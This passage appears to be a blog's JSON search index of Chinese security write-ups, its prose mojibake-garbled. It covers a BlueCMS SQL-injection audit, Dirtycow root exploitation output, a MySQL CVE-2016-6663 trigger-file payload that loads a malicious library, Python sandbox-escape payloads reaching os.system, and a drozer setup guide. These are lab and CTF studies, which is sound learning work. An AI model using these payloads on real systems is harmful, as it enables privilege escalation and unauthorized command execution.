getenv(&apos;HTTP_FORWARDED&apos;); &#125; else &#123; $ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; &#125; return $ip;&#125; å†çœ‹çœ‹è°ƒç”¨ä»–çš„ä½ç½® online_ipè°ƒç”¨å¤„ çœ‹çœ‹guest_book.phpå¤„å­˜åœ¨insertæ³¨å…¥ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è¦†ç›–åé¢çš„contentï¼Œé€ æˆæ•°æ®å›æ˜¾ã€‚é€šè¿‡xffä¼ å…¥æ³¨å…¥è¯­å¥æˆ–è€…client ipä¼ å…¥ã€‚ ç»“æœå¯ä»¥çœ‹åˆ° å…¶ä»–ä½ç½®çš„æ³¨å…¥ï¼Œä¸èƒ½å›æ˜¾ï¼Œå°±ä¸åˆ†æäº†ã€‚ æ€»ç»“æ€»ä½“æ¥è¯´ï¼Œç›´æ¥å¯ä»¥grepåˆ°$_GETã€$_POSTã€$_REQUESTçš„cmsï¼Œå®¡è®¡èµ·æ¥ä¼šæ¯”è¾ƒè½»æ¾ã€‚å¯ä»¥å…ˆä»å…¥å£çœ‹èµ·ï¼Œå°†common,configç­‰æ–‡ä»¶çœ‹ä¸€éï¼Œå†æŸ¥æ‰¾å±é™©å‡½æ•°ï¼Œæ•°æ®å…¥å£å°±å¯å®¡è®¡å‡ºå‡ ä¸ªæ¼æ´æ¥ã€‚bluecmsæš‚æ—¶å®¡è®¡åˆ°è¿™ä¸€æ­¥ï¼Œä¸»è¦æ‰¾çš„æ˜¯SQLæ³¨å…¥çš„æ¼æ´ã€‚å…¶ä»–æ¼æ´æ‰“ç®—å‡†å¤‡å¦å¤–ä¸€å¥—cmsæ¥å®¡è®¡:)"},{"title":"CVE-2016-5195 Dirtycow","permalink":"http://blog.0kami.cn/2016/10/26/old-old-dirtycow-cve-2016-5195/","text":"æ¦‚è¿°æœ€è¿‘å‡ºæ¥çš„dirtycowï¼Œå½±å“ç‰ˆæœ¬:Linux kernel &gt;= 2.6.22ï¼ˆ2007å¹´å‘è¡Œï¼Œåˆ°ä»Šå¹´10æœˆ18æ—¥æ‰ä¿®å¤ï¼‰,ç”¨ç½‘ä¸Šçš„EXPè¯•äº†ä¸€ä¸‹ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹ EXPhttps://www.exploit-db.com/exploits/40616/è¿™ä¸ªEXPæ˜¯exploitdbä¸Šçš„ï¼Œä½†æ˜¯å®¹æ˜“é€ æˆç³»ç»Ÿå´©æºƒï¼ŒæˆåŠŸåä¼šè¿”å›ä¸€ä¸ªrootæƒé™çš„shell 123456789101112131415okami@ubuntu14:~$ ./dirtycowDirtyCow root privilege escalationBacking up /usr/bin/passwd.. to /tmp/bakSize of binary: 47032Racing, this may take a while..thread stoppedthread stopped/usr/bin/passwd is overwrittenPopping root shell.Don&apos;t forget to restore /tmp/bakroot@ubuntu14:/home/okami# iduid=0(root) gid=1000(okami) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(okami)root@ubuntu14:/home/okami# whoamirootroot@ubuntu14:/home/okami# https://github.com/scumjr/dirtycow-vdsoè¿™ä¸ªEXPä¸ä¼šå‡ºç°ç³»ç»Ÿå´©æºƒï¼Œä½†æ˜¯ä½œè€…æœ¬äººè¯´ä¸é€‚ç”¨äºæ‰€æœ‰linuxç‰ˆæœ¬ï¼Œä¸è¿‡è¯•éªŒäº†ä¸€ä¸‹ï¼Œubuntu14 16 centOS7éƒ½å¯ä»¥123456789101112131415161718192021okami@ubuntu14:~$ ./0xdeadbeef[*] exploit: patch 1/2[*] vdso successfully backdoored[*] exploit: patch 2/2[*] vdso successfully backdoored[*] waiting for reverse connect shell...[*] enjoy![*] restore: patch 2/2[*] vdso successfully restored[*] restore: patch 1/2[*] vdso successfully restorediduid=0(root) gid=0(root) groups=0(root)whoamirootlsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 14.04.5 LTSRelease: 14.04Codename: trusty æ³¨æ„è¿™é‡Œæœ‰ä¸€æ­¥æ˜¯waiting for reverse connect shellâ€¦ï¼Œéœ€è¦ä¸€ç‚¹æ—¶é—´ï¼ŒæˆåŠŸåæœ‰rootæƒé™çš„shell"},{"title":"MYSQLææƒåˆ†æ","permalink":"http://blog.0kami.cn/2016/09/18/old-old-cve-2016-6663-mysql-exp/","text":"æ¦‚è¿°å‡ å¤©å‰å‡ºäº†mysqlæœ¬åœ°ææƒçš„0dayï¼Œè™½ç„¶ç°åœ¨å®˜æ–¹å·²ç»å‡ºäº†è¡¥ä¸ï¼Œä½†æ˜¯å—å½±å“çš„ä¸»æœºè¿˜æ˜¯æŒºå¤šçš„ã€‚è·Ÿè¿›æ“ä½œä¸€éï¼šï¼‰ æ¼æ´å½±å“1234567MySQL &lt;= 5.7.15 è¿œç¨‹ä»£ç æ‰§è¡Œ/ ææƒ (0day) 5.6.33 5.5.52Mysqlåˆ†æ”¯çš„ç‰ˆæœ¬ä¹Ÿå—å½±å“,åŒ…æ‹¬ï¼š MariaDB PerconaDB å®éªŒåˆ†æè¿™æ¬¡å®éªŒä¸»è¦ä½¿ç”¨dockeræ­å»ºç¯å¢ƒï¼Œæœ‰éœ€è¦çš„åŒå­¦å¯ä»¥pullæˆ‘çš„åº“ç©0kami/vulenv:cve-2016-6663å®éªŒä¸»è¦ä»attackerçš„è§’åº¦å…¥æ‰‹ï¼Œé¢„å…ˆæ‹¥æœ‰çš„æƒé™ï¼š1234mysql è´¦æˆ·æ‹¥æœ‰fileæƒé™ bob/bobexp mysql_hookandroot_lib.cmysql-server-5.6my.cnfå¯è¢«mysqlç»„æ”¹å†™å†™ å…ˆæŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ä¿¡æ¯å°†/etc/mysql/my.cnfæƒé™ä¿®æ”¹æ‰åˆ›å»ºbobç”¨æˆ·ï¼Œå¹¶èµ‹äºˆfileï¼Œselectï¼Œinsertæƒé™ï¼Œåˆ›å»ºç”¨äºå®éªŒçš„æ•°æ®åº“activedbå’Œè¡¨active_tableå°†expå…ˆå†™å…¥tmpç›®å½•ï¼Œå¹¶ç¼–è¯‘æˆsoæ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹ipï¼Œportå’Œmy.cnfçš„ä½ç½®gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.c.so mysql_hookandroot_lib.c.c -ldlæœ€åä¸€æ­¥å°±æ˜¯å‡†å¤‡ä¸€ä¸‹active_tableçš„è§¦å‘å™¨äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç°åœ¨è‡ªå·±ç”µè„‘ä¸Šrootç”¨æˆ·æƒé™ä¸‹ç”Ÿæˆä¸€ä¸ªtraggeråœ¨activedbæ•°æ®ä¸‹ä¼šç”Ÿæˆä¸€ä¸ªè§¦å‘å™¨åˆ°æ­¤ä½ç½®æˆ‘ä»¬æ‰€æœ‰çš„å‡†å¤‡å·¥ä½œéƒ½åšå¥½äº†ã€‚è®©æˆ‘ä»¬ç”¨bobç”¨æˆ·æ¥å¼¹ä¸ªshellå§1select &quot;TYPE=TRIGGERS\\ntriggers=&apos;CREATE DEFINER=`root`@`localhost` TRIGGER active_table\\nAFTER INSERT\\n ON `active_table` FOR EACH ROW\\nBEGIN\\n DECLARE void varchar(550);\\n set global general_log_file=\\\\\\&apos;/etc/mysql/my.cnf\\\\\\&apos;;\\n set global general_log = on;\\n select \\&quot;\\n[mysqld]\\nmalloc_lib=\\\\\\&apos;/tmp/mysql_hookandroot_lib.so\\\\\\&apos;\\n\\&quot; INTO void; \\n set global general_log = off;\\nEND&apos;\\nsql_modes=1073741824\\ndefiners=&apos;root@localhost&apos;\\nclient_cs_names=&apos;latin1&apos;\\nconnection_cl_names=&apos;latin1_swedish_ci&apos;\\ndb_cl_names=&apos;latin1_swedish_ci&apos;&quot; into dumpfile &apos;/var/lib/mysql/activedb/active_table.TRG&apos;; ç”¨bobçš„ç”¨æˆ·å†™å…¥æ–‡ä»¶äº§ç”Ÿä¸€ä¸ªè§¦å‘å™¨ï¼Œè¿™ä¸ªè§¦å‘å™¨å½“äº§ç”Ÿinsertæ—¶è§¦å‘æ¥æŸ¥çœ‹ä¸€ä¸‹ï¼Œæ‰§è¡Œåçš„/etc/mysql/my.cnfçš„å†…å®¹é‡å¯ä¸€ä¸‹æ•°æ®åº“ï¼Œåå¼¹ä¸€ä¸ªshellå‘ç°å¯å†™çš„my.cnfä¼šè¢«å¿½ç•¥ï¼Ÿï¼Ÿï¼Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ˆéš¾é“æ‰“è¡¥ä¸äº†ï¼Ÿï¼‰ï¼Œä¸çŸ¥é“5.5çš„æƒ…å†µä¼šæ€ä¹ˆæ ·ï¼Œæ‰€ä»¥å…ˆæŠŠmy.cnfçš„æƒé™æ”¹å›æ¥744æˆåŠŸåå¼¹ä¸€ä¸ªshellï¼Œè¿™è¾¹è¿”å›çš„ä¸€ä¸ªshellæ˜¯mysqlæƒé™çš„ æ˜¯å› ä¸ºæˆ‘æµ‹è¯•çš„ç¯å¢ƒmysqld_safeæ˜¯ä»¥mysqlæƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥å¼¹å‡ºæ¥çš„æƒé™æ˜¯mysqlçš„ï¼Œä½†æ˜¯å¦‚æœmysqld_safeæ˜¯ä»¥rootæƒé™è¿è¡Œï¼Œé‚£ä¹ˆåå¼¹çš„shellå°±æ˜¯rootæƒé™çš„ï¼Œé€ æˆææƒã€‚ æ€»ç»“æµ‹è¯•ç¯å¢ƒæ­å»ºè¿˜æœ‰åˆ©ç”¨è¿‡ç¨‹è¿˜æ˜¯å‡ºç°äº†å¾ˆå¤šé—®é¢˜ï¼Œå¯å†™çš„my.cnfä¼šè¢«å¿½ç•¥è½½å…¥ï¼ˆä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºä¿®å¤è¿‡çš„åŸå› ï¼‰ï¼Œtriggersçš„åˆ©ç”¨ï¼ˆå¯ä»¥åŒæ ·åˆ©ç”¨åœ¨æ‹¥æœ‰fileæƒé™çš„æƒ…å†µä¸‹æå‡æƒé™ï¼Œè¿™ä¸ªåˆ°æ—¶å€™å†æ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼‰"},{"title":"python sandbox escape","permalink":"http://blog.0kami.cn/2016/09/16/old-old-python-sandbox-escape/","text":"æ¦‚è¿°å‰å‡ å¤©çš„åå±±æ¯å‡ºäº†ä¸€é“pythonçš„æ²™ç›’é€ƒé€¸ï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ã€‚åœ¨ç½‘ä¸Šæœç´¢äº†ä¸€ä¸‹ï¼Œå‘ç°å¾ˆæ—©å°±å‡ºè¿‡è¿™ç§ç±»å‹çš„é¢˜ï¼Œæºç éƒ½å·®ä¸å¤šã€‚å­¦ä¹ äº†ä¸€ä¸‹æ€è·¯ï¼Œè¿™é‡Œæ€»ç»“ä¸€ä¸‹ï¼šï¼‰ ä»‹ç»æ²™ç›’æºç å¦‚ä¸‹ï¼š123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env pythonfrom __future__ import print_functionprint(\"Welcome to my Python sandbox! Enter commands below!\")banned = [ \"import\", \"exec\", \"eval\", \"pickle\", \"os\", \"subprocess\", \"kevin sucks\", \"input\", \"banned\", \"cry sum more\", \"sys\"]targets = __builtins__.__dict__.keys() targets.remove('raw_input') targets.remove('print') for x in targets:# å»é™¤æ‰€æœ‰å†…ç½®å‡½æ•°é™¤print raw_input del __builtins__.__dict__[x]while 1: print(\"&gt;&gt;&gt;\", end=' ') data = raw_input() for no in banned: if no.lower() in data.lower(): print(\"No bueno\") break else: # this means nobreak exec data ä¸èƒ½å‡ºç°bannedåˆ—è¡¨ä¸­çš„å­—ç¬¦ï¼Œä½†æ˜¯éœ€è¦è¯»å–flagæ–‡ä»¶å†…å®¹ã€‚ åŸç†ç»•è¿‡å‰é¢çš„é™åˆ¶ï¼Œæˆ‘ä»¬æ¥ä¸€æ­¥ä¸€æ­¥çœ‹payload æ–¹æ³•ä¸€123456&gt;&gt;&gt; [].__class__&lt;type &apos;list&apos;&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;type &apos;dict&apos;&gt;&gt;&gt;&gt; ().__class__&lt;type &apos;tuple&apos;&gt; é¦–å…ˆpythonçš„å†…ç½®å¯¹è±¡æœ‰ä¸€ä¸ªclasså±æ€§æ¥å­˜å‚¨ç±»å‹ï¼Œæˆ‘ä»¬å¾€ä¸Šæ‰¾ä»–çš„çˆ¶ç±»ä½¿ç”¨baseå±æ€§123456&gt;&gt;&gt; &#123;&#125;.__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; [].__class__.__base__&lt;type &apos;object&apos;&gt; å¯ä»¥çœ‹åˆ°è¿”å›objectå¯¹è±¡ï¼Œå› ä¸ºpythonä¸­ä¸€åˆ‡å‡ä¸ºå¯¹è±¡ï¼Œå‡ç»§æ‰¿objectå¯¹è±¡ï¼Œå¾—åˆ°objectä¹‹åæˆ‘ä»¬å°±å¯åœ¨é€šè¿‡å±æ€§subclassesæ¥æŸ¥çœ‹objectçš„å­ç±»ï¼ˆåŒ…æ‹¬æ‰€æœ‰çš„å†…ç½®ç±»ï¼‰12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;] å›åˆ°æˆ‘ä»¬çš„ä¸»è¦ç›®çš„ä¸Šï¼Œæˆ‘ä»¬éœ€è¦è¯»å–flagæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œåœ¨è¿™äº›å­ç±»ä¸­æœ‰å“ªäº›æ˜¯å¯ä»¥ç”¨æ¥è¯»å–æ–‡ä»¶å†…å®¹çš„å‘¢ï¼Ÿç­”æ¡ˆæ˜¯fileå­ç±»ï¼Œé¦–å…ˆæŸ¥æ‰¾ä¸€ä¸‹fileå­ç±»çš„ä½ç½®ã€‚12&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(file)40 è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å»ºç«‹ä¸€ä¸ªfileç±»çš„åˆ«åè¯»æ–‡ä»¶å•¦ï¼šï¼‰12&gt;&gt;&gt; f=[].__class__.__base__.__subclasses__()[40]&gt;&gt;&gt; f(&apos;./flag.txt&apos;).read() ï¼Ÿï¼Ÿï¼Ÿæ²¡æœ‰ä»»ä½•å†…å®¹æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯ä»–æ²¡æœ‰æŠ¥é”™è¯´æ˜å­˜åœ¨flag.txtæ–‡ä»¶ï¼Œæˆ‘ä»¬å°è¯•ç”¨ä»–ç»™çš„printå‡½æ•°æ¥æ‰“å°12&gt;&gt;&gt; print(f(&apos;./flag.txt&apos;).read())This is a Flag&#123;enjoy_yourself_ctfer&#125; å¾—åˆ°flag æ–¹æ³•äºŒåŒæ ·çš„è¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯ä½¿ç”¨osæ¨¡å—æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤systemï¼Œä½†æ˜¯osè¢«å±è”½12&gt;&gt;&gt; import osNo bueno æˆ‘ä»¬å¾—æƒ³å…¶ä»–åŠæ³•æ¥è·å–shellã€‚é€šè¿‡ä¸Šé¢çš„æ€è·¯ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå­ç±»ä»–èƒ½è°ƒç”¨osæ¨¡å—ï¼Œè¿™é‡Œç”¨åˆ°äº†warnings.catch_warningsç±»1234567&gt;&gt;&gt; import warnings&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)59&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]&lt;class &apos;warnings.catch_warnings&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()[&apos;filterwarnings&apos;, &apos;once_registry&apos;, &apos;WarningMessage&apos;, &apos;_show_warning&apos;, &apos;filters&apos;, &apos;_setoption&apos;, &apos;showwarning&apos;, &apos;__all__&apos;, &apos;onceregistry&apos;, &apos;__package__&apos;, &apos;simplefilter&apos;, &apos;default_action&apos;, &apos;_getcategory&apos;, &apos;__builtins__&apos;, &apos;catch_warnings&apos;, &apos;__file__&apos;, &apos;warnpy3k&apos;, &apos;sys&apos;, &apos;__name__&apos;, &apos;warn_explicit&apos;, &apos;types&apos;, &apos;warn&apos;, &apos;_processoptions&apos;, &apos;defaultaction&apos;, &apos;__doc__&apos;, &apos;linecache&apos;, &apos;_OptionError&apos;, &apos;resetwarnings&apos;, &apos;formatwarning&apos;, &apos;_getaction&apos;] æ¥ä¸‹æ¥å†æ‰¾linecache1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys().index(&apos;linecache&apos;)25&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.keys()[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;] å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯ä»¥è°ƒç”¨osæ¨¡å—ï¼Œæ¥ä¸‹æ¥å°±è°ƒç”¨systemå‡½æ•°äº†1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;)144 æ•´ç†ä¸€ä¸‹123456789101112&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&gt;&gt;&gt; a&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; s=a.__dict__.keys().index(&apos;system&apos;)&gt;&gt;&gt; s144&gt;&gt;&gt; s=a.__dict__.keys()[144]&gt;&gt;&gt; s&apos;system&apos;&gt;&gt;&gt; s=a.__dict__.values()[144]&gt;&gt;&gt; s(&apos;pwd&apos;)/home/xxxx/Desktop/code/python-code/test å¥½äº†ç°åœ¨å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼Œcatä¸€ä¸‹flag12&gt;&gt;&gt; s(&apos;cat flag.txt&apos;)This is a Flag&#123;enjoy_yourself_ctfer&#125; æ€»ç»“é€šè¿‡ä¸Šé¢çš„pythonæ²™ç›’é€ƒé€¸ï¼Œå‘ç°è¯»pythonå®˜ç½‘æ‰‹å†Œè¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œæ‰¾ä¸ªæ—¶é—´ä¸€ç‚¹ä¸€ç‚¹çœ‹ï¼šï¼‰å…±å‹‰ å‚è€ƒhttps://hexplo.it/escaping-the-csawctf-python-sandbox/"},{"title":"how to install drozer on mac","permalink":"http://blog.0kami.cn/2016/08/20/old-old-how-to-install-drozer-on-mac/","text":"ä¸€ï¼šæ¦‚è¿°drozeræ˜¯ä¸€æ¬¾é’ˆå¯¹Androidç³»ç»Ÿçš„å®‰å…¨æµ‹è¯•æ¡†æ¶ã€‚drozerå¯ä»¥å¸®åŠ©Android appå’Œè®¾å¤‡å˜å¾—æ›´å®‰å…¨ï¼Œå…¶æä¾›äº†å¾ˆå¤šAndroidå¹³å°ä¸‹çš„æ¸—é€æµ‹è¯•exploitä¾›ä½ ä½¿ç”¨å’Œåˆ†äº«ã€‚å¯¹äºè¿œç¨‹çš„exploitï¼Œå®ƒå¯ä»¥ç”Ÿæˆshellcodeå¸®åŠ©ä½ è¿›è¡Œè¿œç¨‹è®¾å¤‡ç®¡ç†ã€‚ æ›´å¿«çš„Androidå®‰å…¨è¯„ä¼°drozerå¯ä»¥å¤§å¤§ç¼©å‡Androidå®‰å…¨è¯„ä¼°çš„è€—æ—¶ï¼Œé€šè¿‡æ”»å‡»æµ‹è¯•æš´éœ²Android APPçš„æ¼æ´ã€‚ åŸºäºçœŸæœºçš„æµ‹è¯•drozerè¿è¡Œåœ¨Androidæ¨¡æ‹Ÿå™¨å’ŒçœŸå®è®¾å¤‡ä¸Šï¼Œå®ƒåªéœ€è¦USBè°ƒè¯•å³å¯ä½¿ç”¨ã€‚ è‡ªåŠ¨åŒ–å’Œæ‰©å±•drozeræœ‰å¾ˆå¤šæ‰©å±•æ¨¡å—ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä»–ä»¬è¿›è¡Œæµ‹è¯•ä»¥å‘ç°Androidå®‰å…¨é—®é¢˜ã€‚ äºŒï¼šå®‰è£…drozerä¸‹è½½é“¾æ¥ï¼šhttps://github.com/mwrlabs/drozer windowå’ŒLinuxä¸‹çš„å®‰è£…è¦ç®€å•çš„å¤šï¼Œä½†æ˜¯åœ¨macä¸Šå®‰è£…æ—¶é‡åˆ°äº†ä¸€äº›é”™è¯¯ï¼Œå› æ­¤å°†è‡ªå·±çš„å®‰è£…æ­¥éª¤è®°å½•ä¸‹æ¥ã€‚ å› ä¸ºæ˜¯ç”¨pythonå†™çš„ï¼Œæ‰€ä»¥Macå¯ä»¥ä¸‹è½½python.eggæ–‡ä»¶è¿›è¡Œå®‰è£…ã€‚ä½†æ˜¯æƒ³é€šè¿‡easy_installå®‰è£…ï¼Œå¿…é¡»æ‹¥æœ‰ä»¥ä¸‹è¿™äº›æ¨¡å—ï¼š 123456789101112cffi==1.1.2cryptography==0.9.3drozer==2.3.4enum34==1.0.4idna==2.0ipaddress==1.0.14protobuf==2.4.1pyasn1==0.1.8pycparser==2.14pyOpenSSL==0.13six==1.9.0Twisted==10.2.0 è€Œå®‰è£…è¿‡ç¨‹ä¸­ä¸»è¦çš„é”™è¯¯æ˜¯ç”±pyOpenSSLé€ æˆçš„ã€‚ 1.1 å®‰è£…openssl12$ brew uninstall openssl #if installed already$ brew install openssl 1.2 ç¼–è¯‘pyOpenSSLä¸å¹¸çš„æ˜¯åœ¨åé¢å®‰è£…Python.eggè¿˜æ˜¯ä¼šæŠ¥é”™,åŸå› æ˜¯Drozeréœ€è¦ç‰¹æ®Šç‰ˆæœ¬çš„opensslï¼Œæˆ‘ä»¬éœ€è¦ä¸‹è½½ pyOpenSSL v0.13ï¼Œç„¶åç”¨sedæŒ‡ä»¤ä¿®å¤typoï¼Œå…·ä½“æŒ‡ä»¤ï¼š1234$ wget https://pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.13.tar.gz$ tar xzvf pyOpenSSL-0.13.tar.gz$ cd pyOpenSSL-0.13$ sed -i &apos;&apos; &apos;s/X509_REVOKED_dup/X509_REVOKED_dupe/&apos; OpenSSL/crypto/crl.c æ¥ä¸‹æ¥æˆ‘ä»¬build OpenSSLï¼Œè¿™é‡Œéœ€è¦æŒ‡æ˜æœ¬æœºä¸­OpenSSL headersæ–‡ä»¶çš„ä½ç½®ï¼š123$ python setup.py build_ext -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include$ python setup.py build$ python setup.py install 1.3 å®‰è£…å…¶ä»–æ”¯æ’‘æ–‡ä»¶ç»ˆäºè¿›å…¥å®‰è£…è¯´æ˜æ–‡æ¡£ä¸­çš„æ­¥éª¤äº†12$ sudo easy_install --allow-hosts pypi.python.org protobuf==2.4.1$ sudo easy_install twisted==10.2.0 #ignore any warnings/errors, it works 1.4 å®‰è£…drozeræœ€åä¸€æ­¥ï¼Œinstall drozer1$ sudo easy_install ./drozer-2.3.4-py2.7.egg 1.5 runnningæ­¤æ—¶å¯ä»¥åœ¨ä»»ä½•ç›®å½•ä¸‹ä½¿ç”¨drozer å‘½ä»¤å•¦ï¼ ä¸‰ï¼šDrozerå…¥é—¨â€” è·å–App Packageä¿¡æ¯æ­¤å¤„ä»¥sieve.apkä¸ºä¾‹ drozeræ¯ä¸ªæ¨¡å—çš„ä½œç”¨ï¼š è·å–AppåŒ…ä¿¡æ¯çš„æ¨¡å—æ˜¯ ** app.package.* : 2.1 è·å–è·å–Androidè®¾å¤‡ä¸Šçš„æ‰€æœ‰çš„å®‰è£…çš„Appçš„åŒ…åå‘½ä»¤æ˜¯ï¼š1run app.package.info -a com.mwr.example.sieve run app.package.list è¿™æ¡å‘½ä»¤ä¼šæŠŠæ‰€æœ‰çš„Appéƒ½åˆ—å‡ºæ¥ï¼Œå¦‚æœæƒ³å…·ä½“æŸ¥æ‰¾æŸä¸ªAppå¯åŠ ä¸Š-f [Appå…³é”®å­—]çš„å‚æ•°ï¼Œå¦‚æŸ¥æ‰¾sieveåœ¨Androidè®¾å¤‡ä¸­çš„åŒ…åï¼š1run app.package.list -f sieve 2.2 è·å–Sieveçš„ä¸€äº›åŸºæœ¬ä¿¡æ¯1run app.package.info -a com.mwr.example.sieve 2.3 Itentify The Attack Surface(ç¡®å®šæ”»å‡»é¢)è¿™ä¸ªæµ‹è¯•æ•™ç¨‹ä¸»è¦å…³æ³¨çš„æ˜¯Android å›ºæœ‰çš„IPCé€šä¿¡æœºåˆ¶çš„è„†å¼±æ€§ï¼Œè¿™äº›ç‰¹ç‚¹å¯¼è‡´äº†Appæ³„æ¼æ•æ„Ÿä¿¡æ¯ç»™åŒä¸€å°è®¾å¤‡ä¸Šçš„å…¶å®ƒAppã€‚ æŸ¥æ‰¾å¯ä»¥è¿›è¡ŒAttack Surfaceçš„ç»„ä»¶çš„å‘½ä»¤ï¼š1run app.package.attacksurface com.mwr.example.sieve ç»“æœæ˜¾ç¤ºäº†æ½œåœ¨å¯ä»¥åˆ©ç”¨çš„ç»„ä»¶ä¸ªæ•°ï¼š 